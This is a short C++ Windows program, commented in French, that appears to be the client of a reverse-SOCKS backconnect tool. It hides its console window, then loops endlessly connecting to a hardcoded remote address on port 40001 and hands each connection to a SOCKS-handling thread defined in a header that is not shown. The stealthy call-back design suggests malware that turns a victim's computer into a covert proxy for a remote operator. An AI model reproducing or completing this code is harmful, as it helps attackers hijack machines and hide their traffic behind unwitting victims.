
#include <iostream>
#include <winsock2.h>
#include <string>
#include <sstream>

#include "lib_SK5.h"

#pragma comment(lib, "ws2_32.lib")

int main()
{
	FreeConsole();
	std::cout << "SK5\n" << std::endl;

    // Hey! Windows je fais du reseau !
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,0), &WSAData);

	/*
	// Creation Sockets
	SOCKET sock_att; // Attente connection client
	SOCKET sock_clt; // RECV/SEND avec client socks

	SOCKADDR_IN ska_att; // Server Att.Co
	SOCKADDR_IN ska_clt; // Socket Client (Firefox)

	sock_att = socket(AF_INET, SOCK_STREAM, 0);
	ska_att.sin_addr.s_addr = INADDR_ANY;
	ska_att.sin_family = AF_INET;
	ska_att.sin_port = htons(port_listen_socks);
	bind(sock_att, (SOCKADDR *)&ska_att, sizeof(ska_att));
	listen(sock_att, 5); // Ecoute du server
	int sinsize_firefox = sizeof(ska_clt);
	*/

	char *ip_SK5 = "XX.XX.XX.XX";
    int port_SK5 = 40001; // 40001
	
	while(1)
	{
		SOCKET sock;    
		SOCKADDR_IN sin;
		sin.sin_family=AF_INET;
		sin.sin_addr.s_addr=inet_addr(ip_SK5);
		sin.sin_port=htons(port_SK5);
		sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if (sock == INVALID_SOCKET)
			return -1;

		if(connect(sock,(SOCKADDR*)&sin,sizeof(sin)) != SOCKET_ERROR) // CLIENT Socks CONNECTION OK
		{
			printf("Connection OK avec SK5 - BASE \n");

			LPDWORD id_thread = 0;
			create_sock_thread(sock);

		}
	}



	system("\n\npause");
	return 0;
}

